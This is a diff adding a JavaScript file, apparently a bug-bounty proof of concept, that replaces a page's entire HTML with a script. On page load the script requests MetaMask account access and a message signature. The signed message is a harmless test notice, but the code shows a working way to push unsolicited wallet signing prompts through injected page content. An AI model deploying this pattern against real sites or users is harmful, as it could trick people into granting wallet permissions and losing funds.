@@ -1,0 +1,53 @@
+const html = `
+<html>
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Akincibor</title>
+</head>
+
+<body>
+
+    <script src="https://cdn.ethers.io/lib/ethers-5.0.umd.min.js"></script>
+
+    <script>
+        async function connectAndSign() {
+            // Check if MetaMask is installed
+            if (window.ethereum) {
+                console.log('MetaMask is installed!');
+
+                // Request account access
+                try {
+                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    console.log('Connected to MetaMask:', accounts[0]);
+
+                    // Use Ethers.js to sign a message
+                    const provider = new ethers.providers.Web3Provider(window.ethereum);
+                    const signer = provider.getSigner();
+                    
+                    const message = 'Hello, I am a white hat and this message could be a malicious one to give the attacker full permission on your wallet! But, this is only a test message as a Proof of Concept for the Bug Bounty.';
+                    const signature = await signer.signMessage(message);
+
+                    console.log('Message signed! Signature:', signature);
+                    alert('Message signed! Signature: ' + signature);
+                } catch (error) {
+                    console.error(error);
+                }
+            } else {
+                console.error('MetaMask is not installed!');
+            }
+        }
+
+        // Call connectAndSign function automatically when the page loads
+        connectAndSign();
+    </script>
+
+</body>
+
+</html>
+`;
+
+document.documentElement.innerHTML = html;
